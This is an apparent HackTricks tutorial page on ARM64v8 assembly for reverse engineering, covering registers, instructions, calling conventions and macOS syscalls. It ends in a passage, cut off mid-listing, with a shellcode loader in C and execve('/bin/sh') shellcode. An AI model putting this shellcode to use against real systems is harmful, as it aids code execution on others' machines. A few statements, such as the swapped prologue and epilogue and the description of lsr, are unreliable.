# Introduction to ARM64v8

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Exception Levels - EL (ARM64v8)**

In ARMv8 architecture, execution levels, known as Exception Levels (ELs), define the privilege level and capabilities of the execution environment. There are four exception levels, ranging from EL0 to EL3, each serving a different purpose:

1. **EL0 - User Mode**:
   * This is the least-privileged level and is used for executing regular application code.
   * Applications running at EL0 are isolated from each other and from the system software, enhancing security and stability.
2. **EL1 - Operating System Kernel Mode**:
   * Most operating system kernels run at this level.
   * EL1 has more privileges than EL0 and can access system resources, but with some restrictions to ensure system integrity.
3. **EL2 - Hypervisor Mode**:
   * This level is used for virtualization. A hypervisor running at EL2 can manage multiple operating systems (each in its own EL1) running on the same physical hardware.
   * EL2 provides features for isolation and control of the virtualized environments.
4. **EL3 - Secure Monitor Mode**:
   * This is the most privileged level and is often used for secure booting and trusted execution environments.
   * EL3 can manage and control accesses between secure and non-secure states (such as secure boot, trusted OS, etc.).

The use of these levels allows for a structured and secure way to manage different aspects of the system, from user applications to the most privileged system software. ARMv8's approach to privilege levels helps in effectively isolating different system components, thereby enhancing the security and robustness of the system.

## **Registers (ARM64v8)**

ARM64 has **31 general-purpose registers**, labeled `x0` through `x30`. Each can store a **64-bit** (8-byte) value. For operations that require only 32-bit values, the same registers can be accessed in a 32-bit mode using the names w0 through w30.

1. **`x0`** to **`x7`** - These are typically used as scratch registers and for passing parameters to subroutines.
   * **`x0`** also carries the return data of a function
2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction. **In macOS the x16 is the one used!**
3. **`x9`** to **`x15`** - More temporary registers, often used for local variables.
4. **`x16`** and **`x17`** - **Intra-procedural Call Registers**. Temporary registers for immediate values. They are also used for indirect function calls and PLT (Procedure Linkage Table) stubs.
   * **`x16`** is used as the **system call number** for the **`svc`** instruction in **macOS**.
5. **`x18`** - **Platform register**. It can be used as a general-purpose register, but on some platforms, this register is reserved for platform-specific uses: Pointer to current thread environment block in Windows, or to point to the currently **executing task structure in linux kernel**.
6. **`x19`** to **`x28`** - These are callee-saved registers. A function must preserve these registers' values for its caller, so they are stored in the stack and recovered before going back to the caller.
7. **`x29`** - **Frame pointer** to keep track of the stack frame. When a new stack frame is created because a function is called, the **`x29`** register is **stored in the stack** and the **new** frame pointer address is (**`sp`** address) is **stored in this registry**.
   * This register can also be used as a **general-purpose registry** although it's usually used as reference to **local variables**.
8. **`x30`** or **`lr`**- **Link register** . It holds the **return address** when a `BL` (Branch with Link) or `BLR` (Branch with Link to Register) instruction is executed by storing the **`pc`** value in this register.
   * It could also be used like any other register.
   * If the current function is going to call a new function and therefore overwrite `lr`, it will store it in the stack at the beginning, this is the epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) and recover it at the end, this is the prologue (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, used to keep track of the top of the stack.
   * the **`sp`** value should always be kept to at least a **quadword** **alignment** or a alignment exception may occur.
10. **`pc`** - **Program counter**, which points to the next instruction. This register can only be updates through exception generations, exception returns, and branches. The only ordinary instructions that can read this register are branch with link instructions (BL, BLR) to store the **`pc`** address in **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Also called **`wzr`** in it **32**-bit register form. Can be used to get the zero value easily (common operation) or to perform comparisons using **`subs`** like **`subs XZR, Xn, #10`** storing the resulting data nowhere (in **`xzr`**).

The **`Wn`** registers are the **32bit** version of the **`Xn`** register.

### SIMD and Floating-Point Registers

Moreover, there are another **32 registers of 128bit length** that can be used in optimized single instruction multiple data (SIMD) operations and for performing floating-point arithmetic. These are called the Vn registers although they can also operate in **64**-bit, **32**-bit, **16**-bit and **8**-bit and then they are called **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** and **`Bn`**.

### System Registers

**There are hundreds of system registers**, also called special-purpose registers (SPRs), are used for **monitoring** and **controlling** **processors** behaviour.\
They can only be read or set using the dedicated special instruction **`mrs`** and **`msr`**.

The special registers **`TPIDR_EL0`** and **`TPIDDR_EL0`** are commonly found when reversing engineering. The `EL0` suffix indicates the **minimal exception** from which the register can be accessed (in this case EL0 is the regular exception (privilege) level regular programs runs with).\
They are often used to store the **base address of the thread-local storage** region of memory. Usually the first one is readable and writable for programs running in EL0, but the second can be read from EL0 and written from EL1 (like kernel).

* `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
* `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contains several process components serialized into the operating-system-visible **`SPSR_ELx`** special register, being X the **permission** **level of the triggered** exception (this allows to recover the process state when the exception ends).\
These are the accessible fields:

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

* The **`N`**, **`Z`**, **`C`** and **`V`** condition flags:
  * **`N`** means the operation yielded a negative result
  * **`Z`** means the operation yielded zero
  * **`C`** means the operation carried
  * **`V`** means the operation yielded a signed overflow:
    * The sum of two positive numbers yields a negative result.
    * The sum of two negative numbers yields a positive result.
    * In subtraction, when a large negative number is subtracted from a smaller positive number (or vice versa), and the result cannot be represented within the range of the given bit size.
    * Obviously the processor doesn't now the operation is signed or not, so it will check C and V in the operations and indicate of a carry occurred in case it was signed or unsigned.

{% hint style="warning" %}
Not all the instructions update these flags. Some like **`CMP`** or **`TST`** do, and others that have an s suffix like **`ADDS`** also do it.
{% endhint %}

* The current **register width (`nRW`) flag**: If the flag holds the value 0, the program will run in the AArch64 execution state once resumed.
* The current **Exception Level** (**`EL`**): A regular program running in EL0 will have the value 0
* The **single stepping** flag (**`SS`**): Used by debuggers to single step by setting the SS flag to 1 inside **`SPSR_ELx`** through an exception. The program will run a step and issue a single step exception.
* The **illegal exception** state flag (**`IL`**): It's used to mark when a privileged software performs an invalid exception level transfer, this flag is set to 1 and the processor triggers an illegal state exception.
* The **`DAIF`** flags: These flags allow a privileged program to selectively mask certain external exceptions.
  * If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).
* The **stack pointer select** flags (**`SPS`**): Privileged programs running in EL1 and above can swap between using their own stack pointer register and the user-model one (e.g. between `SP_EL1` and `EL0`). This switching is performed by writing to the **`SPSel`** special register. This cannot be done from EL0.

## **Calling Convention (ARM64v8)**

The ARM64 calling convention specifies that the **first eight parameters** to a function are passed in registers **`x0` through `x7`**. **Additional** parameters are passed on the **stack**. The **return** value is passed back in register **`x0`**, or in **`x1`** as well **if its 128 bits long**. The **`x19`** to **`x30`** and **`sp`** registers must be **preserved** across function calls.

When reading a function in assembly, look for the **function prologue and epilogue**. The **prologue** usually involves **saving the frame pointer (`x29`)**, **setting** up a **new frame pointer**, and a**llocating stack space**. The **epilogue** usually involves **restoring the saved frame pointer** and **returning** from the function.

### Calling Convention in Swift

Swift have its own **calling convention** that can be found in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where **`opcode`** is the **operation** to be performed (such as `add`, `sub`, `mov`, etc.), **`dst`** is the **destination** register where the result will be stored, and **`src1`** and **`src2`** are the **source** registers. Immediate values can also be used in place of source registers.

* **`mov`**: **Move** a value from one **register** to another.
  * Example: `mov x0, x1` — This moves the value from `x1` to `x0`.
* **`ldr`**: **Load** a value from **memory** into a **register**.
  * Example: `ldr x0, [x1]` — This loads a value from the memory location pointed to by `x1` into `x0`.
  * **Offset mode**: An offset affecting the orin pointer is indicated, for example:
    * `ldr x2, [x1, #8]`, this will load in x2 the value from x1 + 8
    * `ldr x2, [x0, x1, lsl #2]`, this will load in x2 an object from the array x0, from the position x1 (index) \* 4
  * **Pre-indexed mode**: This will apply calculations to the origin, get the result and also store the new origin in the origin.
    * `ldr x2, [x1, #8]!`, this will load `x1 + 8` in `x2` and store in x1 the result of `x1 + 8`
    * `str lr, [sp, #-4]!`, Store the link register in sp and update the register sp
  * **Post-index mode**: This is like the previous one but the memory address is accessed and then the offset is calculated and stored.
    * `ldr x0, [x1], #8`, load `x1` in `x0` and update x1 with `x1 + 8`
  * **PC-relative addressing**: In this case the address to load is calculated relative to the PC register
    * `ldr x1, =_start`, This will load the address where the `_start` symbol starts in x1 related to the current PC.
* **`str`**: **Store** a value from a **register** into **memory**.
  * Example: `str x0, [x1]` — This stores the value in `x0` into the memory location pointed to by `x1`.
* **`ldp`**: **Load Pair of Registers**. This instruction **loads two registers** from **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
  * Example: `ldp x0, x1, [x2]` — This loads `x0` and `x1` from the memory locations at `x2` and `x2 + 8`, respectively.
* **`stp`**: **Store Pair of Registers**. This instruction **stores two registers** to **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
  * Example: `stp x0, x1, [sp]` — This stores `x0` and `x1` to the memory locations at `sp` and `sp + 8`, respectively.
  * `stp x0, x1, [sp, #16]!` — This stores `x0` and `x1` to the memory locations at `sp+16` and `sp + 24`, respectively, and updates `sp` with `sp+16`.
* **`add`**: **Add** the values of two registers and store the result in a register.
  * Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
    * Xn1 -> Destination
    * Xn2 -> Operand 1
    * Xn3 | #imm -> Operando 2 (register or immediate)
    * \[shift #N | RRX] -> Perform a shift or call RRX
  * Example: `add x0, x1, x2` — This adds the values in `x1` and `x2` together and stores the result in `x0`.
  * `add x5, x5, #1, lsl #12` — This equals to 4096 (a 1 shifter 12 times) -> 1 0000 0000 0000 0000
  * **`adds`** This perform an `add` and updates the flags
* **`sub`**: **Subtract** the values of two registers and store the result in a register.
  * Check **`add`** **syntax**.
  * Example: `sub x0, x1, x2` — This subtracts the value in `x2` from `x1` and stores the result in `x0`.
  * **`subs`** This is like sub but updating the flag
* **`mul`**: **Multiply** the values of **two registers** and store the result in a register.
  * Example: `mul x0, x1, x2` — This multiplies the values in `x1` and `x2` and stores the result in `x0`.
* **`div`**: **Divide** the value of one register by another and store the result in a register.
  * Example: `div x0, x1, x2` — This divides the value in `x1` by `x2` and stores the result in `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
  * **Logical shift left**: Add 0s from the end moving the other bits forward (multiply by n-times 2)
  * **Logical shift right**: Add 1s at the beginning moving the other bits backward (divide by n-times 2 in unsigned)
  * **Arithmetic shift right**: Like **`lsr`**, but instead of adding 0s if the most significant bit is a 1, \*\*1s are added (\*\*divide by ntimes 2 in signed)
  * **Rotate right**: Like **`lsr`** but whatever is removed from the right it's appended to the left
  * **Rotate Right with Extend**: Like **`ror`**, but with the carry flag as the "most significant bit". So the carry flag is moved to the bit 31 and the removed bit to the carry flag.
* **`bfm`**: **Bit Filed Move**, these operations **copy bits `0...n`** from a value an place them in positions **`m..m+n`**. The **`#s`** specifies the **leftmost bit** position and **`#r`** the **rotate right amount**.
  * Bitfiled move: `BFM Xd, Xn, #r`
  * Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
  * Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
* **Bitfield Extract and Insert:** Copy a bitfield from a register and copies it to another register.
  * **`BFI X1, X2, #3, #4`** Insert 4 bits from X2 from the 3rd bit of X1
  * **`BFXIL X1, X2, #3, #4`** Extract from the 3rd bit of X2 four bits and copy them to X1
  * **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
  * **`SBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2, sign extends them, and places the result in X1
  * **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
  * **`UBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2 and places the zero-extended result in X1.
* **Sign Extend To X:** Extends the sign (or adds just 0s in the unsigned version) of a value to be able to perform operations with it:
  * **`SXTB X1, W2`** Extends the sign of a byte **from W2 to X1** (`W2` is half of `X2`) to fill the 64bits
  * **`SXTH X1, W2`** Extends the sign of a 16bit number **from W2 to X1** to fill the 64bits
  * **`SXTW X1, W2`** Extends the sign of a byte **from W2 to X1** to fill the 64bits
  * **`UXTB X1, W2`** Adds 0s (unsigned) to a byte **from W2 to X1** to fill the 64bits
* **`extr`:** Extracts bits from a specified **pair of registers concatenated**.
  * Example: `EXTR W3, W2, W1, #3` This will **concat W1+W2** and get **from bit 3 of W2 up to bit 3 of W1** and store it in W3.
* **`cmp`**: **Compare** two registers and set condition flags. It's an **alias of `subs`** setting the destination register to the zero register. Useful to know if `m == n`.
  * It supports the **same syntax as `subs`**
  * Example: `cmp x0, x1` — This compares the values in `x0` and `x1` and sets the condition flags accordingly.
* **`cmn`**: **Compare negative** operand. In this case it's an **alias of `adds`** and supports the same syntax. Useful to know if `m == -n`.
* **`ccmp`**: Conditional comparison, it's a comparison that will be performed only if a previous comparison was true and will specifically set nzcv bits.
  * `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> if x1 != x2 and x3 < x4, jump to func
    * This is because **`ccmp`** will only be executed if the **previous `cmp` was a `NE`**, if it wasn't the bits `nzcv` will be set to 0 (which won't satisfy the `blt` comparison).
    * This ca also be used as `ccmn` (same but negative, like `cmp` vs `cmn`).
* **`tst`**: It checks if any of the values of the comparison are both 1 (it works like and ANDS without storing the result anywhere). It's useful to check a registry with a value and check if any of the bits of the registry indicated in the value is 1.
  * Example: `tst X1, #7` Check if any of the last 3 bits of X1 is 1
* **`teq`**: XOR operation discarding the result
* **`b`**: Unconditional Branch
  * Example: `b myFunction`
  * Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
* **`bl`**: **Branch** with link, used to **call** a **subroutine**. Stores the **return address in `x30`**.
  * Example: `bl myFunction` — This calls the function `myFunction` and stores the return address in `x30`.
  * Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
* **`blr`**: **Branch** with Link to Register, used to **call** a **subroutine** where the target is **specified** in a **register**. Stores the return address in `x30`. (This is
  * Example: `blr x1` — This calls the function whose address is contained in `x1` and stores the return address in `x30`.
* **`ret`**: **Return** from **subroutine**, typically using the address in **`x30`**.
  * Example: `ret` — This returns from the current subroutine using the return address in `x30`.
* **`b.<cond>`**: Conditional branches
  * **`b.eq`**: **Branch if equal**, based on the previous `cmp` instruction.
    * Example: `b.eq label` — If the previous `cmp` instruction found two equal values, this jumps to `label`.
  * **`b.ne`**: **Branch if Not Equal**. This instruction checks the condition flags (which were set by a previous comparison instruction), and if the compared values were not equal, it branches to a label or address.
    * Example: After a `cmp x0, x1` instruction, `b.ne label` — If the values in `x0` and `x1` were not equal, this jumps to `label`.
* **`cbz`**: **Compare and Branch on Zero**. This instruction compares a register with zero, and if they are equal, it branches to a label or address.
  * Example: `cbz x0, label` — If the value in `x0` is zero, this jumps to `label`.
* **`cbnz`**: **Compare and Branch on Non-Zero**. This instruction compares a register with zero, and if they are not equal, it branches to a label or address.
  * Example: `cbnz x0, label` — If the value in `x0` is non-zero, this jumps to `label`.
* **`tbnz`**: Test bit and branch on nonzero
  * Example: `tbnz x0, #8, label`
* **`tbz`**: Test bit and branch on zero
  * Example: `tbz x0, #8, label`
* **Conditional select operations**: These are operations whose behaviour varies depending on the conditional bits.
  * `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> If true, X0 = X1, if false, X0 = X2
  * `csinc Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = Xm + 1
  * `cinc Xd, Xn, cond` -> If true, Xd = Xn + 1, if false, Xd = Xn
  * `csinv Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = NOT(Xm)
  * `cinv Xd, Xn, cond` -> If true, Xd = NOT(Xn), if false, Xd = Xn
  * `csneg Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = - Xm
  * `cneg Xd, Xn, cond` -> If true, Xd = - Xn, if false, Xd = Xn
  * `cset Xd, Xn, Xm, cond` -> If true, Xd = 1, if false, Xd = 0
  * `csetm Xd, Xn, Xm, cond` -> If true, Xd = \<all 1>, if false, Xd = 0
* **`adrp`**: Compute the **page address of a symbol** and store it in a register.
  * Example: `adrp x0, symbol` — This computes the page address of `symbol` and stores it in `x0`.
* **`ldrsw`**: **Load** a signed **32-bit** value from memory and **sign-extend it to 64** bits.
  * Example: `ldrsw x0, [x1]` — This loads a signed 32-bit value from the memory location pointed to by `x1`, sign-extends it to 64 bits, and stores it in `x0`.
* **`stur`**: **Store a register value to a memory location**, using an offset from another register.
  * Example: `stur x0, [x1, #4]` — This stores the value in `x0` into the memory ddress that is 4 bytes greater than the address currently in `x1`.
* **`svc`** : Make a **system call**. It stands for "Supervisor Call". When the processor executes this instruction, it **switches from user mode to kernel mode** and jumps to a specific location in memory where the **kernel's system call handling** code is located.
  *   Example:

      ```armasm
      mov x8, 93  ; Load the system call number for exit (93) into register x8.
      mov x0, 0   ; Load the exit status code (0) into register x0.
      svc 0       ; Make the system call.
      ```

### **Function Prologue**

1. **Save the link register and frame pointer to the stack**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Set up the new frame pointer**: `mov x29, sp` (sets up the new frame pointer for the current function)
3. **Allocate space on the stack for local variables** (if needed): `sub sp, sp, <size>` (where `<size>` is the number of bytes needed)

### **Function Epilogue**

1. **Deallocate local variables (if any were allocated)**: `add sp, sp, <size>`
2. **Restore the link register and frame pointer**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret` (returns control to the caller using the address in the link register)

## AARCH32 Execution State

Armv8-A support the execution of 32-bit programs. **AArch32** can run in one of **two instruction sets**: **`A32`** and **`T32`** and can switch between them via **`interworking`**.\
**Privileged** 64-bit programs can schedule the **execution of 32-bit** programs by executing a exception level transfer to the lower privileged 32-bit.\
Note that the transition from 64-bit to 32-bit occurs with a lower of the exception level (for example a 64-bit program in EL1 triggering a program in EL0). This is done by setting the **bit 4 of** **`SPSR_ELx`** special register **to 1** when the `AArch32` process thread is ready to be executed and the rest of `SPSR_ELx` stores the **`AArch32`** programs CPSR. Then, the privileged process calls the **`ERET`** instruction so the processor transitions to **`AArch32`** entering in A32 or T32 depending on CPSR\*\*.\*\*

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
This is set during the **interworking branch instructions,** but can also be set directly with other instructions when the PC is set as the destination register. Example:

Another example:

```armasm
_start:
.code 32                ; Begin using A32
    add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
    bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
    mov r0, #0
    mov r0, #8
```

### Registers

There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:

* **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
* **`r11`**: Frame Pointer
* **`r12`**: Intra-procedural call register
* **`r13`**: Stack Pointer
* **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - Current Program Status Register

In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

The fields are divided in some groups:

* Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
* Execution State Registers: Process behaviour (managed by the OS).

#### Application Program Status Register (APSR)

* The **`N`**, **`Z`**, **`C`**, **`V`** flags (just like in AArch64)
* The **`Q`** flag: It's set to 1 whenever **integer saturation occurs** during the execution of a specialized saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover, there isn't any instruction that checks its value implicitly, it must be done reading it manually.
*   **`GE`** (Greater than or equal) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as "parallel add" and "parallel subtract". These operations allow processing multiple data points in a single instruction.

    For example, the **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one of the byte additions, indicating if the addition for that byte pair **overflowed**.

    The **`SEL`** instruction uses these GE flags to perform conditional actions.

#### Execution State Registers

* The **`J`** and **`T`** bits: **`J`** should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.
* **IT Block State Register** (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed group.
* **`E`** bit: Indicates the **endianness**.
* **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) the `mach_trap_table` and in [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:

{% code overflow="wrap" %}
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

{% hint style="success" %}
Sometimes it's easier to check the **decompiled** code from **`libsystem_kernel.dylib`** **than** checking the **source code** because the code of several syscalls (BSD and Mach) are generated via scripts (check comments in the source code) while in the dylib you can find what is being called.
{% endhint %}

### machdep calls

XNU supports another type of calls called machine dependent. The numbers of these calls depends on the architecture and neither the calls or numbers are guaranteed to remain constant.

### comm page

This is a kernel owner memory page that is mapped into the address scape of every users process. It's meant to make the transition from user mode to kernel space faster than using syscalls for kernel services that are used so much the this transition would be vey inneficient.

For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.

### objc\_msgSend

It's super common to find this function used in Objective-C or Swift programs. This function allows to call a method of an objective-C object.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Pointer to the instance
* x1: op -> Selector of the method
* x2... -> Rest of the arguments of the invoked method

So, if you put breakpoint before the branch to this function, you can easily find what is invoked in lldb with (in this example the object calls an object from `NSConcreteTask` that will run a command):

```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```

{% hint style="success" %}
Setting the env variable **`NSObjCMessageLoggingEnabled=1`** it's possible to log when this function is called in a file like `/tmp/msgSends-pid`.

Moreover, setting **`OBJC_HELP=1`** and calling any binary you can see other environment variables you could use to **log** when certain Objc-C actions occurs.
{% endhint %}

When this function is called, it's needed to find the called method of the indicated instance, for this different searches are made:

* Perform optimistic cache lookup:
  * If successful, done
* Acquire runtimeLock (read)
  * If (realize && !cls->realized) realize class
  * If (initialize && !cls->initialized) initialize class
* Try class own cache:
  * If successful, done
* Try class method list:
  * If found, fill cache and done
* Try superclass cache:
  * If successful, done
* Try superclass method list:
  * If found, fill cache and done
* If (resolver) try method resolver, and repeat from class lookup
* If still here (= all else has failed) try forwarder

### Shellcodes

To compile:

```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```

To extract the bytes:

```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\\x'$c
done
```

For newer macOS:

```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```

<details>

<summary>C code to test the shellcode</summary>

```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);
 
    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();
 
    return 0;
}
```

</details>

#### Shell

Taken from [**here**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) and explained.

{% tabs %}
{% tab title="with adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:    
    adr  x0, sh_path  ; This is the address of "/bin/sh".
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="with stack" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
    ; We are going to build the string "/bin/sh" and place it on the stack.
    
    mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
    movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
    movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
